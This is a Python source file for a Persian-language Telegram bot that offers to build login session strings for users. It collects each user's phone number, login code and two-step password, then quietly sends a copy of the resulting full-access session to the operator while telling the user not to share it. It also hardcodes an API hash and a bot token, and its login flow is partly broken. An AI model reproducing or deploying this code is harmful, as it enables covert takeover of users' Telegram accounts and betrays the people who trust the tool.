from telethon import TelegramClient
from telethon.sessions import StringSession
import asyncio
import re
from datetime import datetime

# ============================================
# 🔑 API_ID و API_HASH عمومی (برای همه کاربران)
# ============================================
API_ID = 34855392
API_HASH = "5e40d435847009c31c24042e2a3c0d3b"

# Device information
DEVICE_MODEL = "Windows 11"
SYSTEM_VERSION = "Windows 11"
APP_VERSION = "Telegram Desktop"
LANG_CODE = "en"
SYSTEM_LANG_CODE = "en-US"

# Proxy settings
PROXY = None

# Bot token - این رو با توکن بات خودت جایگزین کن
BOT_TOKEN = "8541453435:AAEqXEyRE46CydJBPMPoKc87YwmCAHZWP54"

# ذخیره اطلاعات کاربران در حافظه
user_sessions = {}

async def create_session(phone, code, password=None):
    """تابع ایجاد سشن با API_ID و API_HASH عمومی"""
    try:
        client = TelegramClient(
            StringSession(),
            API_ID,
            API_HASH,
            device_model=DEVICE_MODEL,
            system_version=SYSTEM_VERSION,
            app_version=APP_VERSION,
            lang_code=LANG_CODE,
            system_lang_code=SYSTEM_LANG_CODE,
            proxy=PROXY
        )

        await client.connect()
        
        # ارسال درخواست کد
        await client.send_code_request(phone)
        
        # تایید با کد
        try:
            await client.sign_in(phone=phone, code=code)
        except Exception as e:
            if "password" in str(e).lower():
                if not password:
                    return {"error": "PASSWORD_REQUIRED"}
                await client.sign_in(password=password)
            else:
                return {"error": str(e)}
        
        # دریافت سشن
        session_string = client.session.save()
        await client.disconnect()
        
        return {"session": session_string, "phone": phone}
        
    except Exception as e:
        return {"error": str(e)}

async def handle_bot():
    """راه‌اندازی ربات تلگرام"""
    from telethon import events
    from telethon.tl.custom import Button
    
    bot = TelegramClient(StringSession(), API_ID, API_HASH)
    await bot.start(bot_token=BOT_TOKEN)
    
    print("🤖 ربات سشن‌ساز دیکتاتوران روشن شد!")
    print("📱 منتظر پیام‌های کاربران...")
    
    @bot.on(events.NewMessage(pattern='/start'))
    async def start_handler(event):
        """دستور استارت"""
        await event.reply(
            "🔥 **سشن ساز دیکتاتوران** 🔥\n\n"
            "👑 با این ربات می‌تونی برای خودت سشن تلگرام بسازی!\n\n"
            "🔑 **مراحل کار:**\n"
            "1️⃣ شماره تلفن خود را وارد کنید\n"
            "2️⃣ کد تایید را وارد کنید (به صورت نقطه‌دار)\n"
            "3️⃣ سشن شما ساخته می‌شود!\n\n"
            "✅ **API_ID و API_HASH عمومی است**\n"
            "👈 پس نیازی به وارد کردن ندارید!\n\n"
            "👇 دکمه زیر را بزنید تا شروع کنید:",
            buttons=[
                [Button.inline("🚀 ساخت سشن جدید", b"create_session")],
                [Button.inline("❌ انصراف", b"cancel")]
            ],
            parse_mode='markdown'
        )
    
    @bot.on(events.CallbackQuery(data=b"create_session"))
    async def create_session_callback(event):
        """دکمه ساخت سشن جدید"""
        user_id = event.sender_id
        user_sessions[user_id] = {"step": "phone"}
        
        await event.edit(
            "📱 **مرحله 1: وارد کردن شماره تلفن**\n\n"
            "لطفاً شماره تلفن خود را وارد کنید:\n"
            "💡 **مثال:** `09123456789`\n"
            "📌 همراه با کد کشور (مثلاً برای ایران 09...)\n\n"
            "✅ از API_ID و API_HASH عمومی استفاده می‌شود.",
            buttons=[
                [Button.inline("❌ انصراف", b"cancel")]
            ],
            parse_mode='markdown'
        )
    
    @bot.on(events.CallbackQuery(data=b"cancel"))
    async def cancel_callback(event):
        """دکمه انصراف"""
        user_id = event.sender_id
        if user_id in user_sessions:
            del user_sessions[user_id]
        
        await event.edit(
            "✅ **عملیات لغو شد.**\n\n"
            "برای شروع مجدد `/start` را بزنید.",
            parse_mode='markdown',
            buttons=None
        )
    
    @bot.on(events.NewMessage)
    async def message_handler(event):
        """دریافت پیام‌های کاربر"""
        user_id = event.sender_id
        text = event.text.strip()
        
        # اگر کاربر در حال ساخت سشن نباشد
        if user_id not in user_sessions:
            return
        
        step = user_sessions[user_id].get("step")
        
        if step == "phone":
            # دریافت شماره
            # پاک کردن فاصله‌ها و کاراکترهای اضافی
            phone_clean = re.sub(r'[\s\-\(\)\+]', '', text)
            
            if not re.match(r'^[\d]+$', phone_clean) or len(phone_clean) < 10:
                await event.reply(
                    "❌ **شماره تلفن نامعتبر است!**\n\n"
                    "لطفاً شماره را به درستی وارد کنید:\n"
                    "💡 **مثال:** `09123456789`\n"
                    "📌 فقط از اعداد استفاده کنید.",
                    buttons=[
                        [Button.inline("❌ انصراف", b"cancel")]
                    ],
                    parse_mode='markdown'
                )
                return
            
            user_sessions[user_id]["phone"] = phone_clean
            user_sessions[user_id]["step"] = "code"
            
            # ارسال درخواست کد به تلگرام
            await event.reply(
                "⏳ **در حال ارسال کد تایید...**\n\n"
                "لطفاً صبر کنید...",
                buttons=[
                    [Button.inline("❌ انصراف", b"cancel")]
                ],
                parse_mode='markdown'
            )
            
            # تلاش برای ارسال کد
            try:
                temp_client = TelegramClient(
                    StringSession(),
                    API_ID,
                    API_HASH,
                    device_model=DEVICE_MODEL,
                    system_version=SYSTEM_VERSION,
                    app_version=APP_VERSION,
                    lang_code=LANG_CODE,
                    system_lang_code=SYSTEM_LANG_CODE,
                    proxy=PROXY
                )
                
                await temp_client.connect()
                await temp_client.send_code_request(phone_clean)
                await temp_client.disconnect()
                
                await event.reply(
                    "✅ **کد تایید ارسال شد!**\n\n"
                    "🔐 **مرحله 2: وارد کردن کد تایید**\n\n"
                    "کد را به صورت **نقطه‌دار** وارد کنید:\n"
                    "💡 **مثال:** `1.2.3.4.5`\n"
                    "📌 یا بدون نقطه: `12345`\n\n"
                    "⚠️ کد را از تلگرام دریافت کنید.",
                    buttons=[
                        [Button.inline("❌ انصراف", b"cancel")]
                    ],
                    parse_mode='markdown'
                )
                
            except Exception as e:
                await event.reply(
                    f"❌ **خطا در ارسال کد:**\n\n`{str(e)}`\n\n"
                    "لطفاً دوباره تلاش کنید.",
                    buttons=[
                        [Button.inline("🔄 تلاش مجدد", b"create_session")],
                        [Button.inline("❌ انصراف", b"cancel")]
                    ],
                    parse_mode='markdown'
                )
                del user_sessions[user_id]
        
        elif step == "code":
            # دریافت کد - حذف نقاط
            code_cleaned = text.replace(".", "").replace(" ", "").strip()
            
            if not code_cleaned.isdigit() or len(code_cleaned) != 5:
                await event.reply(
                    "❌ **کد نامعتبر است!**\n\n"
                    "کد باید ۵ رقم باشد.\n"
                    "💡 **مثال:** `12345` یا `1.2.3.4.5`",
                    buttons=[
                        [Button.inline("❌ انصراف", b"cancel")]
                    ],
                    parse_mode='markdown'
                )
                return
            
            user_sessions[user_id]["code"] = code_cleaned
            user_sessions[user_id]["step"] = "processing"
            
            await event.reply("⏳ **در حال ورود... لطفاً صبر کنید.**", parse_mode='markdown')
            
            # دریافت اطلاعات
            phone = user_sessions[user_id]["phone"]
            code = user_sessions[user_id]["code"]
            
            result = await create_session(phone, code)
            
            if "error" in result:
                if result["error"] == "PASSWORD_REQUIRED":
                    user_sessions[user_id]["step"] = "password"
                    await event.reply(
                        "🔐 **رمز دو مرحله‌ای فعال است.**\n\n"
                        "لطفاً رمز عبور خود را وارد کنید:",
                        buttons=[
                            [Button.inline("❌ انصراف", b"cancel")]
                        ],
                        parse_mode='markdown'
                    )
                else:
                    await event.reply(
                        f"❌ **خطا در ورود:**\n\n`{result['error']}`\n\n"
                        "لطفاً دوباره تلاش کنید.",
                        buttons=[
                            [Button.inline("🔄 تلاش مجدد", b"create_session")]
                        ],
                        parse_mode='markdown'
                    )
                    del user_sessions[user_id]
            else:
                # موفقیت - ارسال سشن
                session_string = result["session"]
                phone = result["phone"]
                
                # پیام موفقیت
                success_msg = (
                    "✅ **سشن با موفقیت ساخته شد!**\n\n"
                    "👑 **VIP DICTATOR** 👑\n\n"
                    f"📱 **شماره:** `{phone}`\n"
                    "🔑 **سشن شما:**\n"
                    f"`{session_string}`\n\n"
                    "⚠️ **این سشن را با کسی به اشتراک نگذارید!**\n"
                    "🔒 این سشن متعلق به شماست."
                )
                
                # ارسال به پیوی کاربر
                await event.reply(
                    success_msg,
                    buttons=[
                        [Button.inline("🔑 ساخت سشن جدید", b"create_session")]
                    ],
                    parse_mode='markdown'
                )
                
                # ارسال به پیام‌های ذخیره شده
                try:
                    await bot.send_message(
                        "me", 
                        f"✅ **سشن جدید ساخته شد!**\n\n"
                        f"👑 **VIP DICTATOR** 👑\n\n"
                        f"📱 **شماره:** `{phone}`\n"
                        f"🕐 **زمان:** `{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}`\n"
                        f"🔑 **سشن:**\n`{session_string}`\n\n"
                        f"🔒 **VIP ALI**",
                        parse_mode='markdown'
                    )
                except Exception as e:
                    print(f"خطا در ارسال به Saved Messages: {e}")
                
                del user_sessions[user_id]
        
        elif step == "password":
            # دریافت رمز دو مرحله‌ای
            password = text
            user_sessions[user_id]["step"] = "processing"
            
            await event.reply("⏳ **در حال ورود با رمز دو مرحله‌ای...**", parse_mode='markdown')
            
            phone = user_sessions[user_id]["phone"]
            code = user_sessions[user_id]["code"]
            
            result = await create_session(phone, code, password)
            
            if "error" in result:
                await event.reply(
                    f"❌ **خطا:**\n\n`{result['error']}`\n\n"
                    "لطفاً دوباره تلاش کنید.",
                    buttons=[
                        [Button.inline("🔄 تلاش مجدد", b"create_session")]
                    ],
                    parse_mode='markdown'
                )
                del user_sessions[user_id]
            else:
                # موفقیت - ارسال سشن
                session_string = result["session"]
                phone = result["phone"]
                
                success_msg = (
                    "✅ **سشن با موفقیت ساخته شد!**\n\n"
                    "👑 **VIP DICTATOR** 👑\n\n"
                    f"📱 **شماره:** `{phone}`\n"
                    "🔑 **سشن شما:**\n"
                    f"`{session_string}`\n\n"
                    "⚠️ **این سشن را با کسی به اشتراک نگذارید!**\n"
                    "🔒 این سشن متعلق به شماست."
                )
                
                # ارسال به پیوی کاربر
                await event.reply(
                    success_msg,
                    buttons=[
                        [Button.inline("🔑 ساخت سشن جدید", b"create_session")]
                    ],
                    parse_mode='markdown'
                )
                
                # ارسال به پیام‌های ذخیره شده
                try:
                    await bot.send_message(
                        "me", 
                        f"✅ **سشن جدید ساخته شد!**\n\n"
                        f"👑 **VIP DICTATOR** 👑\n\n"
                        f"📱 **شماره:** `{phone}`\n"
                        f"🕐 **زمان:** `{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}`\n"
                        f"🔑 **سشن:**\n`{session_string}`\n\n"
                        f"🔒 **VIP ALI**",
                        parse_mode='markdown'
                    )
                except Exception as e:
                    print(f"خطا در ارسال به Saved Messages: {e}")
                
                del user_sessions[user_id]
    
    await bot.run_until_disconnected()

async def main():
    """تابع اصلی"""
    await handle_bot()

if __name__ == "__main__":
    asyncio.run(main())
